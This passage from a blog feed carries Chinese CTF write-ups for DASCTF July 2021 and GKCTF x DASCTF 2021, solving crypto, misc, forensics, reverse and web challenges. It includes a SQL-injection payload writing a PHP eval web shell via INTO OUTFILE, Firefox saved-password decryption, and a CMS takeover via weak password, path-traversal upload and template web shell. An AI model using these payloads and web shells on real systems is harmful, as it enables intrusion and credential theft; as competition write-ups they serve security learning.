class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$str</span>))&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\ /i&quot;</span>, <span class="variable">$str</span>))&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;Go away,bad hacker!!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">preg_replace(<span class="string">&#x27;/0x/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>fl_value</code>过滤关键字，可双写绕过；</p><p><code>f1_html</code>中<code>htmlspecialchars</code>只对双引号编码，可用单引号绕过；</p><p><code>f1_vvv</code>中过滤空格和<code>0x</code>，空格可注释绕过，<code>0x</code>双写绕过。</p><p>payload:</p><p><code>user=-1&#39;/**/uni union on/**/selselectect/**/00xx3c3f70687020406576616c28245f504f53545b636d645d293b3f3e,2,3,4,5/**/int into o/**/outoutfilefile/**/&#39;/var/www/html/2.php&#39;%23&amp;password=ss&amp;code=&amp;submit=true&amp;submit.x=46&amp;submit.y=24</code></p><p>写入shell，蚁剑连接，根目录找到flag。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;2021 DASCTF实战精英夏令营预热赛&lt;br&gt;DASCTF July x CBCTF 4th&lt;br&gt;主办单位: 安恒信息、杭州电子科技大学网络空间安全学院&lt;br&gt;竞赛时间: 2021年7月31日10:00- 2021年8月1日18:00&lt;br&gt;</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021赛" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>GKCTF x DASCTF应急挑战杯</title>
    <link href="https://lazzzaro.github.io/2021/06/26/match-GKCTFxDASCTF%E5%BA%94%E6%80%A5%E6%8C%91%E6%88%98%E6%9D%AF/"/>
    <id>https://lazzzaro.github.io/2021/06/26/match-GKCTFxDASCTF%E5%BA%94%E6%80%A5%E6%8C%91%E6%88%98%E6%9D%AF/</id>
    <published>2021-06-26T09:31:36.000Z</published>
    <updated>2021-06-29T11:50:57.838Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>指导单位: 中国移动通信联合会<br>主办单位: 防灾科技学院信息工程学院杭州安恒信息技术股份有限公司<br>本次命题: Ginkgo战队<br>比赛时间: 2021年6月26日09:00-17:00<br>报名时间: 2021年6月21日19:30-6月26日9:00<br>报名地址: buuoj.cn/das</p><p>Rank: 40</p><hr><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Random"><a href="#Random" class="headerlink" title="Random"></a>Random</h3><blockquote><p>flag格式为 GKCTF{}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mask</span>():</span></span><br><span class="line">    file = <span class="built_in">open</span>(<span class="string">&quot;random.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">104</span>):</span><br><span class="line">        file.write(<span class="built_in">str</span>(random.getrandbits(<span class="number">32</span>))+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        file.write(<span class="built_in">str</span>(random.getrandbits(<span class="number">64</span>))+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        file.write(<span class="built_in">str</span>(random.getrandbits(<span class="number">96</span>))+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    file.close()</span><br><span class="line">get_mask()</span><br><span class="line">flag = md5(<span class="built_in">str</span>(random.getrandbits(<span class="number">32</span>)).encode()).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></blockquote><p>Python中random模块采用梅森旋转算法（MT19937）生成伪随机序列中的元素，该PRNG采用32位的state和32位的输出，在获得足够连续输出的情况下，梅森旋转算法接下来的输出值是可以准确预测的。</p><p>根据 <code>random.txt</code> 中104组 <code>random.getrandbits()</code> 函数输出值，利用预测工具 <a href="https://github.com/kmyk/mersenne-twister-predictor">Mersenne Twister Predictor</a> 来求出下一个随机数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> mt19937predictor <span class="keyword">import</span> MT19937Predictor</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">predictor = MT19937Predictor()</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;random.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).readlines()</span><br><span class="line">c1 = []</span><br><span class="line">c2 = []</span><br><span class="line">c3 = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(file),<span class="number">3</span>):</span><br><span class="line">c1 += [<span class="built_in">int</span>(file[k].strip())]</span><br><span class="line">c2 += [<span class="built_in">int</span>(file[k+<span class="number">1</span>].strip())]</span><br><span class="line">c3 += [<span class="built_in">int</span>(file[k+<span class="number">2</span>].strip())]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">104</span>):</span><br><span class="line">predictor.setrandbits(c1[k], <span class="number">32</span>)</span><br><span class="line">predictor.setrandbits(c2[k], <span class="number">64</span>)</span><br><span class="line">predictor.setrandbits(c3[k], <span class="number">96</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(md5(<span class="built_in">str</span>(predictor.getrandbits(<span class="number">32</span>)).encode()).hexdigest())</span><br><span class="line"><span class="comment">#14c71fec812b754b2061a35a4f6d8421</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><blockquote><p>师傅们玩的开心~（flag由flag头包裹</p></blockquote><p>用Wireshark打开流量包文件 <code>tmpshell.pcapng</code>，追踪TCP流，从第3个流开始有HTTP POST数据包，都为 <code>/g1nkgo/tmpshell.php</code> 的RCE结果。</p><p>看到第5个流有 <code>cat /f14g</code> 命令结果，下载下来16进制查看，从文件头 <code>1f8b0800000000000003</code>  知为gzip文件，解压，逆序+base64解码得：</p><p><code>[回车] [回车] [回车] ffllaagg{{}}WWeellcc))[删除] [删除] 00mmee__GGkkCC44FF__mm11ssiiCCCCCCCCCCCC!!</code></p><p>两个相同字符一组还原得flag。</p><p>​    </p><h3 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h3><blockquote><p><a href="https://www.wjx.cn/vj/Y3msOw2.aspx">https://www.wjx.cn/vj/Y3msOw2.aspx</a></p><p>感谢各位师傅参与本次比赛。</p></blockquote><p>填问卷。</p><p>​    </p><h3 id="你知道apng吗"><a href="#你知道apng吗" class="headerlink" title="你知道apng吗"></a>你知道apng吗</h3><blockquote><p>（flag由flag头包裹</p></blockquote><p>apng图片（动态png图片），用apngdis工具提取各帧，发现第2、18、26帧有二维码。</p><p>QR_Research能识别出第18帧为 <code>-ad20</code>，以及第26帧为 <code>-0327-288a235370ea&#125;</code>，第2帧变形二维码无法识别，用在线工具<a href="https://merricx.github.io/qrazybox/">qrazybox</a>照着手绘，得到结果 <code>flag&#123;a3c7e4e5</code>。</p><p>flag应为uuid形式，还少一段，按照2、18、26的间隔，应该在第10帧里，stegsolve查看第10帧，在Red 2通道看到二维码，识别结果 <code>-9b9d</code>。</p><p>拼接得flag。</p><p>​    </p><h3 id="银杏岛の奇妙冒险"><a href="#银杏岛の奇妙冒险" class="headerlink" title="银杏岛の奇妙冒险"></a>银杏岛の奇妙冒险</h3><blockquote><p>链接: <a href="https://pan.baidu.com/s/1cONFRAgjmu2-de67IRthhQ">https://pan.baidu.com/s/1cONFRAgjmu2-de67IRthhQ</a> 密码: 04m0</p><p>链接：<a href="https://share.weiyun.com/hdikz5gL">https://share.weiyun.com/hdikz5gL</a> 密码：yjyh3g</p><p>游戏题</p><p>1.游戏启动需要java1.8环境，无java环境会自动帮助安装java环境，如果你已经有java1.8环境，即可无视这条信息 2.启动 “点击启动.exe” 文件，打开游戏启动器，输入你的ID 3.java环境配置完毕后，最好分配游戏内存至少为2048M 4.进入游戏后，根据游戏内的任务索引完成任务，即可获取flag 5.进入游戏 一定 一定 一定要注意对话信息，否则无法顺利的完成任务 5.祝大家玩的愉快</p></blockquote><p>Minecraft游戏，试玩了下不熟悉，尝试从资源文件入手。</p><p>Everything搜索 <code>flag</code> 关键字，发现 <code>.minecraft\saves\Where is the flag</code> 存档目录，接着在 <code>customnpcs\quests\主线</code> 目录中找到主线对应的json文件有关键字符串：</p><p><code>2.json</code> 中：<code>&quot;&#123;\&quot;text\&quot;:\&quot; part 1\\nw3lc0me_\\n\\npart 2\\n291 -95 67\&quot;&#125;&quot;</code>，</p><p><code>3.json</code> 中：<code>&quot;&#123;\&quot;text\&quot;:\&quot; part 2\\nt0_9kctf_\\n\\npart 3 \\n324 -190 79\&quot;&#125;&quot;</code>，</p><p><code>4.json</code> 中：<code>&quot;&#123;\&quot;text\&quot;:\&quot; part 3\\n2021_\\n\\npart 4\\n362 -144 69\&quot;&#125;&quot;</code>，</p><p><code>5.json</code> 中：<code>&quot;&#123;\&quot;text\&quot;:\&quot; Part 4\\nCheck_1n\\n恭喜你，\\n完成签到，\\n武运昌隆。\&quot;&#125;&quot;</code>，</p><p>前面是内容，后面是下一处的坐标。</p><p>拼接，加头得flag。</p><p>​    </p><h3 id="FireFox-Forensics"><a href="#FireFox-Forensics" class="headerlink" title="FireFox Forensics"></a>FireFox Forensics</h3><blockquote><p>取证大佬说这是一份登录凭证文件</p></blockquote><p>得到 <code>logins.json</code> 和 <code>key4.db</code> 两个文件，结合题目知是火狐浏览器存储密码信息的密钥文件对，直接利用<a href="https://github.com/lclevy/firepwd">Firepwd工具</a>解析（将两个文件置于脚本同一目录下）：</p><p><code>python firepwd.py</code></p><p>结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">globalSalt: b&#x27;1e26e84b2f01da28d865e7258f9003d16b9c43f2&#x27;</span><br><span class="line"> SEQUENCE &#123;</span><br><span class="line">   SEQUENCE &#123;</span><br><span class="line">     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2</span><br><span class="line">     SEQUENCE &#123;</span><br><span class="line">       SEQUENCE &#123;</span><br><span class="line">         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2</span><br><span class="line">         SEQUENCE &#123;</span><br><span class="line">           OCTETSTRING b&#x27;66a735e17767b37d83d464126b36d4269243f9e0c99405ccd68f442798f83129&#x27;</span><br><span class="line">           INTEGER b&#x27;01&#x27;</span><br><span class="line">           INTEGER b&#x27;20&#x27;</span><br><span class="line">           SEQUENCE &#123;</span><br><span class="line">             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256</span><br><span class="line">           &#125;</span><br><span class="line">         &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       SEQUENCE &#123;</span><br><span class="line">         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC</span><br><span class="line">         OCTETSTRING b&#x27;24eb241594de7ab37ec379d9ba06&#x27;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   OCTETSTRING b&#x27;946322a2b2978db6601e449e1bdf7c4d&#x27;</span><br><span class="line"> &#125;</span><br><span class="line">clearText b&#x27;70617373776f72642d636865636b0202&#x27;</span><br><span class="line">password check? True</span><br><span class="line"> SEQUENCE &#123;</span><br><span class="line">   SEQUENCE &#123;</span><br><span class="line">     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2</span><br><span class="line">     SEQUENCE &#123;</span><br><span class="line">       SEQUENCE &#123;</span><br><span class="line">         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2</span><br><span class="line">         SEQUENCE &#123;</span><br><span class="line">           OCTETSTRING b&#x27;56722302469f529a29dc73f28d6af3ed0ee483cceff05772e96e2313336816fd&#x27;</span><br><span class="line">           INTEGER b&#x27;01&#x27;</span><br><span class="line">           INTEGER b&#x27;20&#x27;</span><br><span class="line">           SEQUENCE &#123;</span><br><span class="line">             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256</span><br><span class="line">           &#125;</span><br><span class="line">         &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       SEQUENCE &#123;</span><br><span class="line">         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC</span><br><span class="line">         OCTETSTRING b&#x27;ef6a4df3e5fd7608c97df9e22092&#x27;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   OCTETSTRING b&#x27;51b24cd6a2672c312255d7f2dddeb67336fd56973b4302bb2eacf2270c251d41&#x27;</span><br><span class="line"> &#125;</span><br><span class="line">clearText b&#x27;673dec57458fb95bd50bdc9198541038970e5b3d518973a40808080808080808&#x27;</span><br><span class="line">decrypting login/password pairs</span><br><span class="line">https://ctf.g1nkg0.com:b&#x27;admin&#x27;,b&#x27;GKCTF&#123;9cf21dda-34be-4f6c-a629-9c4647981ad7&#125;&#x27;</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="QQQQT"><a href="#QQQQT" class="headerlink" title="QQQQT"></a>QQQQT</h3><blockquote><p>QQQT？什么东西？</p><p>链接: <a href="https://pan.baidu.com/s/1e0fdBFIZ52EX04PwdgmpRQ">https://pan.baidu.com/s/1e0fdBFIZ52EX04PwdgmpRQ</a> 密码: cfiq</p></blockquote><p>IDA打开，在字符串窗口跟进 <code>56fkoP8KhwCf3v7CEz</code> 找到关键函数 <code>sub_4012F0()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __thiscall <span class="title">sub_4012F0</span><span class="params">(_DWORD *<span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// edi</span></span><br><span class="line">  _BYTE *v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v3; <span class="comment">// edx</span></span><br><span class="line">  _BYTE *v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// esi</span></span><br><span class="line">  _BYTE *v11; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [esp-8h] [ebp-A8h]</span></span><br><span class="line">  <span class="keyword">char</span> v16[<span class="number">4</span>]; <span class="comment">// [esp+10h] [ebp-90h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v17[<span class="number">4</span>]; <span class="comment">// [esp+14h] [ebp-8Ch] BYREF</span></span><br><span class="line">  _BYTE *v18; <span class="comment">// [esp+18h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v19; <span class="comment">// [esp+1Ch] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// [esp+20h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [esp+24h] [ebp-7Ch] BYREF</span></span><br><span class="line">  _BYTE *v22; <span class="comment">// [esp+28h] [ebp-78h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v23[<span class="number">60</span>]; <span class="comment">// [esp+2Ch] [ebp-74h] BYREF</span></span><br><span class="line">  __int128 v24[<span class="number">2</span>]; <span class="comment">// [esp+68h] [ebp-38h] BYREF</span></span><br><span class="line">  __int64 v25; <span class="comment">// [esp+88h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v26; <span class="comment">// [esp+9Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  MEMORY[<span class="number">0x5FF6</span>](*(_DWORD *)(<span class="keyword">this</span>[<span class="number">6</span>] + <span class="number">4</span>), v16);</span><br><span class="line">  v26 = <span class="number">0</span>;</span><br><span class="line">  MEMORY[<span class="number">0x7C7C</span>](v16, v17);</span><br><span class="line">  LOBYTE(v26) = <span class="number">1</span>;</span><br><span class="line">  v19 = (<span class="keyword">const</span> <span class="keyword">char</span> *)MEMORY[<span class="number">0x7C48</span>](v17);</span><br><span class="line">  v24[<span class="number">0</span>] = <span class="number">0</span>i64;</span><br><span class="line">  v24[<span class="number">1</span>] = <span class="number">0</span>i64;</span><br><span class="line">  v25 = <span class="number">0</span>i64;</span><br><span class="line">  <span class="built_in">strcpy</span>(v23, <span class="string">&quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;</span>);</span><br><span class="line">  v21 = <span class="number">138</span> * <span class="built_in">strlen</span>(v19) / <span class="number">0x64</span>;</span><br><span class="line">  v14 = v21 + <span class="number">1</span>;</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  v22 = (_BYTE *)MEMORY[<span class="number">0x8114</span>](v21 + <span class="number">1</span>);</span><br><span class="line">  v2 = v22;</span><br><span class="line">  sub_402C08(v22, <span class="number">0</span>, v14);</span><br><span class="line">  v3 = v19;</span><br><span class="line">  v20 = (<span class="keyword">int</span>)(v19 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v19) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = &amp;v2[v21];</span><br><span class="line">    v18 = v4;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v20 = ((<span class="keyword">char</span>)*v4 &lt;&lt; <span class="number">8</span>) + v3[v1];</span><br><span class="line">      v5 = v20 / <span class="number">58</span>;</span><br><span class="line">      *v4 = v20 % <span class="number">58</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v5 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v6 = (<span class="keyword">char</span>)*--v4;</span><br><span class="line">          v7 = (v6 &lt;&lt; <span class="number">8</span>) + v5;</span><br><span class="line">          v20 = v7 / <span class="number">58</span>;</span><br><span class="line">          *v4 = v7 % <span class="number">58</span>;</span><br><span class="line">          v5 = v20;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v20 );</span><br><span class="line">        v4 = v18;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( ++v1 &gt;= <span class="built_in">strlen</span>(v19) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v3 = v19;</span><br><span class="line">    &#125;</span><br><span class="line">    v2 = v22;</span><br><span class="line">  &#125;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !*v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      ++v8;</span><br><span class="line">    <span class="keyword">while</span> ( !v2[v8] );</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = v21;</span><br><span class="line">  <span class="keyword">if</span> ( v8 &lt;= v21 )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = v2 - (_BYTE *)v24;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v11 = (<span class="keyword">char</span> *)v24 + v8++;</span><br><span class="line">      *v11 = v23[(<span class="keyword">char</span>)v11[v10]];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v8 &lt;= v9 );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !MEMORY[<span class="number">0x7C1A</span>](v24, <span class="string">&quot;56fkoP8KhwCf3v7CEz&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v19 )</span><br><span class="line">      v12 = <span class="built_in">strlen</span>(v19);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v12 = <span class="number">-1</span>;</span><br><span class="line">    v22 = (_BYTE *)MEMORY[<span class="number">0x7CCC</span>](v19, v12);</span><br><span class="line">    LOBYTE(v26) = <span class="number">2</span>;</span><br><span class="line">    v21 = MEMORY[<span class="number">0x7CCC</span>](<span class="string">&quot;flag&quot;</span>, <span class="number">4</span>);</span><br><span class="line">    LOBYTE(v26) = <span class="number">3</span>;</span><br><span class="line">    MEMORY[<span class="number">0x6124</span>](<span class="keyword">this</span>, &amp;v21, &amp;v22, <span class="number">1024</span>, <span class="number">0</span>);</span><br><span class="line">    MEMORY[<span class="number">0x7C66</span>](&amp;v21);</span><br><span class="line">    MEMORY[<span class="number">0x7C66</span>](&amp;v22);</span><br><span class="line">  &#125;</span><br><span class="line">  MEMORY[<span class="number">0x7C30</span>](v17);</span><br><span class="line">  <span class="keyword">return</span> MEMORY[<span class="number">0x7C66</span>]();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析代码逻辑知将输入字符串base58编码后的结果与字符串 <code>56fkoP8KhwCf3v7CEz</code> 比对，直接base58解码 <code>56fkoP8KhwCf3v7CEz</code> 得到 <code>12t4tww3r5e77</code>。加头即flag。</p><p>​    </p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h3><blockquote><p>真·ezcms</p><p>hint: 后台密码5位弱口令</p></blockquote><p>蝉知cms，搜索知该cms存在<strong>后台任意文件读取</strong>与<strong>后台Getshell</strong>漏洞。</p><p>访问 <code>admin.php</code>，根据提示用 <code>admin/12345</code> 登进后台，在<strong>设计-高级</strong>里面可以直接编辑php模板文件：</p><p><img src="/match-GKCTFxDASCTF应急挑战杯/20210626191309.png" alt="20210626191309" style="zoom:80%;" /></p><p>在源码里加上一句话却发现需要验证用户权限：</p><p><img src="/match-GKCTFxDASCTF应急挑战杯/20210626191605.png" alt="20210626191605" style="zoom:80%;" /></p><p>如果编辑模板，需要管理员在cms的 <code>/system/tmp</code> 目录下新建一个名字为 <code>xgem.txt</code> 的文件来验证是否有写入权限。</p><p>在<strong>设计-组件-素材库</strong>可以上传素材，并且可以跨目录上传文件。本地新建一个 <code>xgem.txt</code> 文件，上传后把名称的参数改为 <code>../../../../../system/tmp/xgem</code>：</p><p><img src="/match-GKCTFxDASCTF应急挑战杯/20210626191957.png" alt="20210626191957" style="zoom:80%;" /></p><p>再回到<strong>设计-高级</strong>模板编辑界面，尝试在首页模板文件 <code>/var/www/html/system/tmp/template/default/index/index.html.php</code> 中首行添加 <code>&lt;?php phpinfo();?&gt;</code>，保存。</p><p>回到首页发现执行成功：</p><p><img src="/match-GKCTFxDASCTF应急挑战杯/20210626192413.png" alt="20210626192413" style="zoom:80%;" /></p><p>将代码改为一句话 <code>&lt;?php @eval($_POST[ccc]);?&gt;</code>，蚁剑连接，在根目录访问文件 <code>/flag</code> 得到flag。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;指导单位: 中国移动通信联合会&lt;br&gt;主办单位: 防灾科技学院信息工程学院杭州安恒信息技术股份有限公司&lt;br&gt;本次命题: Ginkgo战队&lt;br&gt;比赛时间: 2021年6月26日09:00-17:00&lt;br&gt;报名时间: 2021年6月21日19:3</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021赛" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>不经意传输</title>
    <link href="https://lazzzaro.github.io/2021/06/20/crypto-%E4%B8%8D%E7%BB%8F%E6%84%8F%E4%BC%A0%E8%BE%93/"/>
    <id>https://lazzzaro.github.io/2021/06/20/crypto-%E4%B8%8D%E7%BB%8F%E6%84%8F%E4%BC%A0%E8%BE%93/</id>
    <published>2021-06-20T04:07:57.000Z</published>
    <updated>2021-06-20T05:29:24.471Z</updated>
    
